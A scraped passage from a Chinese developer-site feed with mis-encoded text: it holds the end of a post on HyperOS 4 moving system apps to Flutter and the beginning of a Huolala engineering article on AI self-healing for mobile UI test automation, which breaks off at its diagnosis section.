<p>HyperOS 4 æ—¨åœ¨ç»Ÿä¸€ç³»ç»Ÿåˆ†åŒºå†…çš„ UI æ¸²æŸ“å’Œé€»è¾‘ç¨³å®šæ€§ï¼Œä»è€Œå–ä»£ä¹‹å‰ MIUI ç‰ˆæœ¬ä¸­ç¢ç‰‡åŒ–çš„ Java/Kotlin é—ç•™æ¶æ„ã€‚</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/327855b295de4b4cbae7c4c94c348874~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oGL54yrZGXlsI_pg60=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770796677&amp;x-signature=vQYq70PPQCR7TF7TroFW3yD1INU%3D" alt="" loading="lazy"/></p>
<p>å½“ç„¶ï¼Œè¿™ç®—æ˜¯ä¸€ä¸ªå¤§çš„ break change ï¼Œä» HyperOS 3.1 å¼€å§‹ï¼ŒåŸºäº Flutter çš„åº”ç”¨ä¼šæ‰“ç ´ä¹‹å‰æ—§ç³»ç»Ÿå¯ä»¥å‡çº§æ–°ç³»ç»Ÿåº”ç”¨çš„æƒ…å†µï¼Œå› ä¸ºæ–°çš„ HyperOS 4 Flutter åº”ç”¨ä¼šæ— æ³•åœ¨ HyperOS 3 åŠæ›´æ—©ç‰ˆæœ¬ä¸Šè¿è¡Œã€‚</p>
<blockquote>
<p>æ³¨æ„ï¼Œè¿™é‡Œè¯´çš„æ˜¯ç”¨æ¥çš„æ–° Hyper SDK çš„ç³»ç»Ÿæ ¸å¿ƒåº”ç”¨ã€‚</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a0d52c82ee741e5a8046e7e4059d82e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oGL54yrZGXlsI_pg60=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770796677&amp;x-signature=0SN4VDkvTHGW2o1Fe7U9kLNYivk%3D" alt="" loading="lazy"/></p>
<p>å…¶å®å¯¹æ¯”æ–°æ—§çš„ç›¸å†Œåº”ç”¨ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥ï¼Œå›¾ä¸€æ˜¯ 4.x ç‰ˆæœ¬ï¼Œ è€Œå›¾è€Œæ˜¯ 5.0-R çš„ç‰ˆæœ¬ï¼Œæ–°ç‰ˆæœ¬åœ¨ libchecker ä¸‹å·²ç»çœ‹ä¸åˆ°ç›¸åº”çš„ Kotlin ä¿¡æ¯äº†ï¼Œç”šè‡³æ²¡æœ‰äº†å¯¹åº”çš„ dex ç›®å½•ï¼Œåªæœ‰åŸç”ŸåŠ¨æ€åº“ ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/05dc413bd67c4a6491b166afbaecc074~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oGL54yrZGXlsI_pg60=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770796677&amp;x-signature=%2FVvqH%2FmXcjI4XAsTgfK7D8w53ZQ%3D" alt="" loading="lazy"/></p>
<p>å¦å¤–ï¼Œä¹Ÿæœ‰ç½‘å‹åˆ†æäº†ä»–å†…éƒ¨çš„ä¾èµ–ï¼Œå¯ä»¥çœ‹åˆ° hyper ç›¸å…³çš„å®ç°ä¸å°‘ï¼Œåº”è¯¥æ˜¯ HyperSDK æä¾›ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8daf5f65615b45488f53f0da388944e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oGL54yrZGXlsI_pg60=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770796677&amp;x-signature=cVtIfpmP2KquOLi8SGrbeJgbkek%3D" alt="" loading="lazy"/></p>
<p>å½“ç„¶ï¼Œxiaomi time ä¹Ÿè¡¨ç¤ºï¼Œæ——èˆ°çº§æœºå‹åœ¨ HyperOS 4 ä¸Šæ€§èƒ½æå‡å¹…åº¦æœ‰é™ï¼Œç›¸åå…¥é—¨çº§å’Œä¸­ç«¯è®¾å¤‡åè€Œå¯èƒ½è·å¾—æ›´æ˜¾è‘—çš„æ€§èƒ½æå‡ï¼Œå› ä¸ºæŠ€æœ¯å€ºåŠ¡çš„æ¶ˆé™¤ï¼Œä¹Ÿå¯ä»¥èŠ‚çœæ›´å¤šçš„ç©ºé—´ã€‚</p>
<p>å½“ç„¶ï¼Œä¹Ÿæœ‰äººçŒœæµ‹è¿™ä¸ªæ“ä½œæ˜¯ä¸ºäº†æå‰å¸ƒå±€ï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li>å°ç±³æœ‰å¾ˆå¤šä¸åŒå¹³å°çš„äº§å“ï¼Œç”¨ flutter å¯ä»¥åšåˆ°ä¸åŒå¹³å°çš„äº§å“ä¹Ÿå¯ä»¥è·¨å¹³å°ï¼Œä¹Ÿå°±æ˜¯æ ¸å¿ƒç³»ç»Ÿåº”ç”¨æœªæ¥æœ‰å¯èƒ½å‡ºç°åœ¨å…¶ä»–å¹³å°ä¸Šï¼Œæ¯”å¦‚æ±½è½¦ï¼Œçœ¼é•œç­‰</li>
</ul>

<ul>
<li>å°ç±³æ‰“ç®—èµ°å’Œåä¸ºä¸€æ ·çš„è·¯çº¿ï¼Œåä¸ºæ—©æœŸä¹Ÿæ˜¯é€šè¿‡ flutter åš UI å±‚å…¼å®¹æŠ½è±¡ï¼Œé€šè¿‡ flutter ï¼Œå¦‚æœåç»­å°ç±³æœ‰ç‹¬ç«‹ç³»ç»Ÿå‘å¸ƒï¼Œåº”ç”¨æ”¯æŒå¯ä»¥æ›´æ–¹ä¾¿ç›´æ¥iè¿ç§»ï¼Œ å› ä¸º flutter åªéœ€è¦é€‚é…åµŒå…¥å±‚å’Œ vulkan å°±å¯ä»¥æ— ç¼é€‚é…</li>
</ul>
<p>ä¸è¿‡è¿™äº›éƒ½åªæ˜¯çŒœæµ‹ï¼Œè€Œä»ç›®å‰çš„æƒ…å†µæ¥çœ‹ï¼Œè¿™ä¸ªå†³ç­–åº”è¯¥æ˜¯çœŸçš„ï¼Œåªæ˜¯å¸¦æ¥çš„å½±å“å¦‚ä½•ï¼Œåªèƒ½ç­‰å®˜æ–¹æ­£å¼å‘å¸ƒåçœ‹çœ‹äº†ã€‚</p>
<h2 data-id="heading-0">å‚è€ƒé“¾æ¥</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fxiaomitime.com%2Fwhy-hyperos-4-will-be-the-most-stable-update-in-xiaomi-history-88033%2F" target="_blank" title="https://xiaomitime.com/why-hyperos-4-will-be-the-most-stable-update-in-xiaomi-history-88033/" ref="nofollow noopener noreferrer">xiaomitime.com/why-hyperosâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è´§æ‹‰æ‹‰UIè‡ªåŠ¨åŒ–æ–°èŒƒå¼ï¼šä»äººå·¥ç»´æŠ¤åˆ°AIè‡ªæ„ˆ]]></title>    <link>https://juejin.cn/post/7602472997921505280</link>    <guid>https://juejin.cn/post/7602472997921505280</guid>    <pubDate>2026-02-04T01:58:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602472997921505280" data-draft-id="7602146335216615464" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è´§æ‹‰æ‹‰UIè‡ªåŠ¨åŒ–æ–°èŒƒå¼ï¼šä»äººå·¥ç»´æŠ¤åˆ°AIè‡ªæ„ˆ"/> <meta itemprop="keywords" content="æµ‹è¯•"/> <meta itemprop="datePublished" content="2026-02-04T01:58:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è´§æ‹‰æ‹‰æŠ€æœ¯"/> <meta itemprop="url" content="https://juejin.cn/user/1768489241815070"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è´§æ‹‰æ‹‰UIè‡ªåŠ¨åŒ–æ–°èŒƒå¼ï¼šä»äººå·¥ç»´æŠ¤åˆ°AIè‡ªæ„ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1768489241815070/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è´§æ‹‰æ‹‰æŠ€æœ¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T01:58:31.000Z" title="Wed Feb 04 2026 01:58:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    159
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»15åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>ä½œè€…ä»‹ç»ï¼šèƒ¡å˜‰æ¤¿ï¼Œæ¥è‡ªè´§æ‹‰æ‹‰/æŠ€æœ¯ä¸­å¿ƒ/è´¨é‡ä¿éšœéƒ¨ï¼Œä¸“æ³¨äºç§»åŠ¨æµ‹è¯•æ•ˆèƒ½æ–¹å‘ã€‚</p>
</blockquote>
<h2 data-id="heading-0">ä¸€ã€èƒŒæ™¯ä¸æŒ‘æˆ˜</h2>
<p>åœ¨ç§»åŠ¨ç«¯æµ‹è¯•ä¸­ï¼Œæˆ‘ä»¬å§‹ç»ˆé¢å¯¹ç€åŒä¸€ä¸ªæ ¸å¿ƒæŒ‘æˆ˜ï¼š<strong>å¦‚ä½•æŒç»­é™ä½æ‰‹å·¥æµ‹è¯•çš„å·¥ä½œé‡ï¼Ÿ</strong> ä¸ºæ­¤ï¼Œæˆ‘ä»¬å›¢é˜Ÿå·²ç»å»ºç«‹èµ·ä¸¤æ¡æˆç†Ÿçš„åˆ›æ–°ææ•ˆè·¯å¾„ï¼š</p>
<ol>
<li><strong>åœ¨è€åŠŸèƒ½å›å½’æµ‹è¯•ä¸Š</strong>ï¼Œæˆ‘ä»¬ä»¥<strong>UIå½•åˆ¶å›æ”¾ï¼ˆå‚è€ƒã€Š</strong> <strong><a href="https://juejin.cn/post/7306331307477794867" target="_blank" title="https://juejin.cn/post/7306331307477794867">è´§æ‹‰æ‹‰Appå½•åˆ¶å›æ”¾çš„æ¢ç´¢ä¸å®è·µ</a></strong> <strong>ã€‹ï¼‰</strong> æŠ€æœ¯ï¼Œé¢ è¦†äº†ä¼ ç»Ÿæ‰‹å†™è„šæœ¬æ¨¡å¼ï¼Œå®ç°äº†è„šæœ¬çš„â€œ<strong>é›¶ä»£ç â€</strong> ç”Ÿæˆä¸å¤§è§„æ¨¡è¦†ç›–ï¼Œä»æ ¹æœ¬ä¸Šè§£å†³äº†è‡ªåŠ¨åŒ–æ™®åŠçš„ç“¶é¢ˆã€‚</li>
<li><strong>åœ¨æ–°åŠŸèƒ½æµ‹è¯•ä¸Š</strong>ï¼Œæˆ‘ä»¬æ¨å‡ºäº†<strong>å¤šæœºåŒæ­¥æ¨¡å¼ï¼ˆå‚è€ƒã€Š</strong> <strong><a href="https://juejin.cn/post/7430902939316109312" target="_blank" title="https://juejin.cn/post/7430902939316109312">è´§æ‹‰æ‹‰äº‘çœŸæœºå¤šæœºåŒæ­¥æ¢ç´¢ä¸å®è·µ</a></strong> <strong>ã€‹ï¼‰</strong> ï¼Œç»•å¼€äº†ä¼ ç»Ÿè„šæœ¬çš„å±€é™ï¼Œå®ç°äº†â€œä¸€ç«¯æ“ä½œã€å¤šç«¯è¦†ç›–â€ï¼Œç¼“è§£äº†å¤šæœºå‹ã€å¤šç«¯å£çš„æ•ˆç‡ç“¶é¢ˆé—®é¢˜ã€‚</li>
</ol>
<p>åŸºäºè¿™äº›åˆ›æ–°å®è·µï¼Œä¸ºæˆ‘ä»¬æ„å»ºäº†è´§æ‹‰æ‹‰ç§»åŠ¨ç«¯æµ‹è¯•çš„ææ•ˆä½“ç³»ã€‚ç„¶è€Œï¼Œæ•ˆç‡æå‡çš„çº¢åˆ©æ­£é€æ¸è§¦è¾¾ç“¶é¢ˆï¼Œè€Œä¸”ä¹Ÿæœ‰æ–°çš„æŒ‘æˆ˜ï¼š</p>
<ul>
<li><strong>è‡ªåŠ¨åŒ–æµ‹è¯•ï¼Œä»éœ€è¦â€œäººå·¥ç»´æŠ¤â€</strong> ï¼šéšç€è„šæœ¬è§„æ¨¡è¶…è¿‡18,000æ¡ï¼ŒApp UIé¢‘ç¹è¿­ä»£å¸¦æ¥çš„è„šæœ¬å¤±æ•ˆé—®é¢˜ï¼Œä½¿æˆ‘ä»¬é™·å…¥äº†æ–°çš„â€œè„šæœ¬ä¿®å¤â€å¾ªç¯ã€‚</li>
<li><strong>æ–°åŠŸèƒ½ï¼Œä»æ˜¯â€œäººå·¥é©±åŠ¨â€</strong> ï¼šå¤šæœºåŒæ­¥æœ¬è´¨ä¸Šæ˜¯å°† N æ¬¡åœ¨æ‰‹æœºä¸Šçš„æ“ä½œå˜æˆ 1 æ¬¡ï¼Œæµ‹è¯•æ‰§è¡Œæœ¬èº«ä¾ç„¶éœ€è¦ä¾èµ–äººå·¥ã€‚</li>
</ul>
<p>å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦ä»ä¸Šè¿°ä¸¤ä¸ªæ–¹å‘ä¸Šå¯»æ±‚çªç ´ï¼Œæ‰“é€šâ€œæœ€åä¸€å…¬é‡Œâ€çš„éšœç¢ï¼ŒçœŸæ­£å®ç°æµ‹è¯•ææ•ˆçš„é—­ç¯ã€‚é’ˆå¯¹æ–°åŠŸèƒ½æµ‹è¯•ä»ä¾èµ–â€œäººå·¥é©±åŠ¨â€çš„ç“¶é¢ˆï¼Œæˆ‘ä»¬å›¢é˜Ÿå·²åœ¨ç§¯ææ¢ç´¢ç›¸å…³è§£å†³æ–¹æ¡ˆï¼Œå¹¶è®¡åˆ’åœ¨åç»­è¿›è¡Œåˆ†äº«ï¼›æœ¬æ–‡åˆ™å°†èšç„¦äº UI è‡ªåŠ¨åŒ–æµ‹è¯•å®è·µä¸­çš„ç¨³å®šæ€§å’Œæ•ˆèƒ½ç“¶é¢ˆï¼Œæ·±å…¥æ¢è®¨å…¶æŒ‘æˆ˜ä¸å®è·µè·¯å¾„ã€‚</p>
<h2 data-id="heading-1">äºŒã€UIè‡ªåŠ¨åŒ–çš„å±€é™æ€§</h2>
<p>æˆ‘ä»¬é€šè¿‡åˆ†æUIè‡ªåŠ¨åŒ–æµ‹è¯•çš„å†å²æŠ¥å‘Šä¸è„šæœ¬ç»´æŠ¤äººå‘˜çš„å®é™…ç—›ç‚¹ï¼Œå‘ç°ä¸¤å¤§æ ¸å¿ƒå›°å¢ƒæ­£åå™¬ç€æµ‹è¯•æ•ˆèƒ½ï¼š</p>
<ul>
<li><strong>è„šæœ¬ç»´æŠ¤çš„â€œå¾ªç¯â€å›°å¢ƒ</strong> ä¼ ç»Ÿ UI è„šæœ¬é«˜åº¦ä¾èµ–å…ƒç´ å®šä½ç­–ç•¥ï¼ˆå¦‚ ID ã€å›¾åƒæˆ–æ–‡æœ¬åŒ¹é…ï¼‰ï¼Œåœ¨è´§æ‹‰æ‹‰å•å‘¨è¿­ä»£App çš„å†²å‡»ä¸‹å¸¦æ¥çš„UIå¾®è°ƒï¼Œæ¯å‘¨éƒ½æœ‰ä¸å°‘çš„è„šæœ¬é™·å…¥â€œæŠ¢æ•‘å¼â€ä¿®å¤ã€‚</li>
<li><strong>æ‰§è¡Œç¨³å®šæ€§çš„ç“¶é¢ˆ</strong> é¢å¯¹å“ç‰Œç¢ç‰‡åŒ–å¸¦æ¥çš„å„ç±»å¼¹çª—â€œçªè¢­â€ï¼ˆå¦‚ç³»ç»Ÿæ¨é€ã€æƒé™ç”³è¯·ã€Appå¹¿å‘Šç­‰ï¼‰ï¼Œè‡ªåŠ¨åŒ–è„šæœ¬çš„å¹³å‡é€šè¿‡ç‡é•¿æœŸå¾˜å¾Šåœ¨80%çš„ç“¶é¢ˆçº¿ä¸Šï¼›ä¸ºä¿éšœç¨³å®šæ€§ï¼Œéœ€è¦æŒç»­åœ¨è„šæœ¬ä¸­å åŠ å„ç±»å¼¹çª—è¯†åˆ«ä¸å¤„ç†é€»è¾‘ï¼Œè¿›ä¸€æ­¥æ‹‰é«˜ç»´æŠ¤æˆæœ¬ã€‚</li>
</ul>
<p>è¿™ä¸¤å¤§å›°å¢ƒå¦‚åŒä¸€ä¸ªæ°¸è¿œå¡«ä¸æ»¡çš„æ²™æ¼ï¼Œä¸æ–­çš„åœ¨èš•é£Ÿå®è´µçš„æµ‹è¯•èµ„æºã€‚</p>
<h2 data-id="heading-2">ä¸‰ã€AIä»‹å…¥UIè‡ªåŠ¨åŒ–</h2>
<p>ä¼ ç»ŸUIè‡ªåŠ¨åŒ–æµ‹è¯•å…ƒç´ å®šä½ç­–ç•¥æš´éœ²å‡ºä¸¥é‡çš„è„†å¼±æ€§å’Œç»´æŠ¤æˆæœ¬ï¼Œæˆ‘ä»¬é€šè¿‡åœ¨æµ‹è¯•æ‰§è¡Œè¿‡ç¨‹ä¸­å¼•å…¥<strong>AI</strong> <strong>è‡ªæ„ˆèƒ½åŠ›ï¼ˆå¤šæ¨¡æ€ç‰¹å¾èåˆ+è§†è§‰æ¨¡å‹+è¯­ä¹‰åˆ†æèƒ½åŠ›ï¼‰ï¼Œ</strong> ä¸ºUIè„šæœ¬æå‡é²æ£’æ€§ã€‚AIä»‹å…¥æ—¶æœºå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f5080afb65b349609d4a6c1816068f3f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770795442&amp;x-signature=Wf2nKuL8HIK506%2Fp%2BkIhE0rq9Pg%3D" alt="image.png" loading="lazy"/></p>
<p>AIé©±åŠ¨çš„UIè‡ªåŠ¨åŒ–ï¼Œçªç ´ä¼ ç»Ÿâ€œè„šæœ¬å¤±æ•ˆå³ä¸­æ–­â€çš„è„†å¼±æ¨¡å¼ï¼Œæ„å»ºæ„ŸçŸ¥-è¯Šæ–­-å†³ç­–-ä¿®å¤çš„æ™ºèƒ½é—­ç¯ä½“ç³»ï¼Œå…¶æ ¸å¿ƒä¼˜åŠ¿åœ¨äºï¼š</p>
<ul>
<li><strong>ç²¾å‡†é—®é¢˜å®šä½ï¼š</strong> å½“ç”¨ä¾‹æ‰§è¡Œä¸­æ–­æ—¶ï¼ŒAIè‡ªæ„ˆé€šè¿‡å¤šæ¨¡æ€æ•°æ®ï¼ˆæˆªå›¾ã€OCRã€DOMã€Exceptionï¼‰è¿›è¡Œæ™ºèƒ½è¯Šæ–­ï¼Œç»“åˆçŸ¥è¯†åº“ã€æ§ä»¶ç”»åƒç²¾å‡†è¯†åˆ«é—®é¢˜ç±»å‹ï¼ˆå¼¹çª—ä¸­æ–­ã€å…ƒç´ å˜æ›´ç­‰ï¼‰ã€‚</li>
<li><strong>é—­ç¯è‡ªæ„ˆèƒ½åŠ›ï¼š</strong> è¯Šæ–­ç»“æœç›´æ¥ç”Ÿæˆç»“æ„åŒ–<code>Action</code>æŒ‡ä»¤ï¼ˆå¦‚â€œå¼¹çª—å…³é—­â€æˆ–â€œå®šä½å™¨ä¿®å¤â€ï¼‰ï¼Œé€šè¿‡æ˜ å°„è„šæœ¬é‡è¯•ï¼Œä»»åŠ¡æˆåŠŸåè‡ªåŠ¨æ›´æ–°ç”¨ä¾‹åº“ï¼Œå®ç°â€œå‘ç°é—®é¢˜â†’åˆ†æé—®é¢˜â†’è§£å†³é—®é¢˜â€çš„å®Œæ•´é—­ç¯ï¼Œæ— éœ€äººå·¥ä»‹å…¥ã€‚</li>
</ul>
<h2 data-id="heading-3">å››ã€AIè‡ªæ„ˆèƒ½åŠ›æ„å»º</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/110c08bf8b684988a52a564bf425b3f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770795442&amp;x-signature=mh%2BkkCGrXpiELEK%2BqZjP%2BuShXbw%3D" alt="image.png" loading="lazy"/>
AIé©±åŠ¨çš„UIè‡ªåŠ¨åŒ–æ–°èŒƒå¼ç³»ç»Ÿæ¶æ„é‡‡ç”¨å¤šå±‚èƒ½åŠ›è®¾è®¡ï¼Œå„å±‚èŒè´£æ˜ç¡®ã€ååŒè¿ä½œï¼š</p>
<ul>
<li>
<p><strong>èƒ½åŠ›å»ºè®¾å±‚é¢</strong> æä¾›å››å¤§æ ¸å¿ƒèƒ½åŠ›ï¼Œå¼¹çª—æ™ºèƒ½å¤„ç†ã€æ–‡æœ¬è‡ªæ„ˆã€å…ƒç´ è‡ªæ„ˆã€æ™ºèƒ½ç­‰å¾…ï¼Œç›´æ¥é¢å‘æµ‹è¯•åœºæ™¯ä¸­çš„å›°éš¾è§£å†³å…·ä½“é—®é¢˜ã€‚</p>
</li>
<li>
<p><strong>æ•°æ®é‡‡é›†å±‚é¢</strong></p>
<ul>
<li>å¤šæ¨¡æ€æ•°æ®åŸºçº¿ï¼šæ•´åˆAPPä¿¡æ¯ã€ç”¨ä¾‹æ­¥éª¤ã€è®¾å¤‡å¿«ç…§ã€OCRä¸DOMæ•°æ®ï¼›</li>
<li>ç”¨ä¾‹åº“ç®¡ç†ï¼šé€šè¿‡è„šæœ¬æ˜ å°„ã€è‡ªæ„ˆæ ‡è®°å®ç°ç”¨ä¾‹æ™ºèƒ½æ›´æ–°ï¼Œç¡®ä¿ä¿®å¤æˆæœæŒç»­æ²‰æ·€ã€‚</li>
</ul>
</li>
<li>
<p><strong>UIè‡ªæ„ˆAgentå±‚é¢</strong></p>
<ul>
<li>çŸ¥è¯†åº“ï¼šæ²‰æ·€ä¸šåŠ¡çŸ¥è¯†ã€å†å²ç»éªŒã€å¼¹çª—ç‰¹å¾ä¸è§„åˆ™æ¨¡æ¿ï¼›</li>
<li>æ™ºèƒ½å¼•æ“ï¼šé©±åŠ¨å¼¹çª—åˆ†æã€æ–‡æœ¬/å…ƒç´ å˜æ›´æ„ŸçŸ¥ç­‰æ ¸å¿ƒèƒ½åŠ›ï¼›</li>
<li>æ™ºèƒ½å†³ç­–ä½“ï¼šå®ç°é—®é¢˜è¯Šæ–­ä¸è¡ŒåŠ¨å†³ç­–çš„é—­ç¯ï¼Œæ˜¯â€œè‡ªæ„ˆå¤§è„‘â€ã€‚</li>
</ul>
</li>
</ul>
<h3 data-id="heading-4">4.1 äº”æ­¥è¯Šæ–­æ³•</h3>
